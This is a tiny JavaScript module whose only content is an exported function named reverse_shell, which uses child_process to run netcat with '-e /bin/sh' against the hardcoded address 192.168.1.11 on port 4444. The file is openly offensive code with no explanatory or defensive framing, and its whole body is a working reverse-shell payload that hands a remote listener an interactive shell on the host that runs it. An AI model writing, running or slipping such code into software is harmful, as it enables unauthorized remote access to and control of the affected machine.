import { spawn } from "child_process";

export function reverse_shell() {
    const execute_code = spawn('nc', [
        '-e', '/bin/sh', '192.168.1.11', '4444'
    ]);
}